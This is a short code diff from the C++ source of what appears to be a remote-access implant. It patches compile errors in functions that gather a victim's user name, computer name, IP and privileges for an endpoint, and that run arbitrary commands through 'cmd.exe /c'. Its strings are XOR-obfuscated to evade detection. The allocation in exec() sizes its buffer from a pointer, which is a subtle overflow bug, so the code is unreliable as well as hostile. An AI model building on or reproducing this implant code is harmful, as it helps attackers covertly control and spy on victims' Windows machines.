@@ -38,7 +38,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             json results_parse = GetAll();
             results.append(results_parse.at(xor_string("][MZfIEM",0x28)));
             results.append(results_parse.at(xor_string("KGEXfIEM",0x28)));
-            results.append(results_parse.at(xor_string("AXfIEM",0x28));
+            results.append(results_parse.at(xor_string("AXfIEM",0x28)));
             results.append(results_parse.at(xor_string("xZA^ADMOM[",0x28)));
 
             /* Formats string so that the endpoint can accept it */
@@ -156,7 +156,7 @@ std::string exec(char* args){
   
    LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
     + 50);
-    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15), args);
+    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15).c_str(), args);
     HANDLE hStdOutRead, hStdOutWrite;
 
     hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
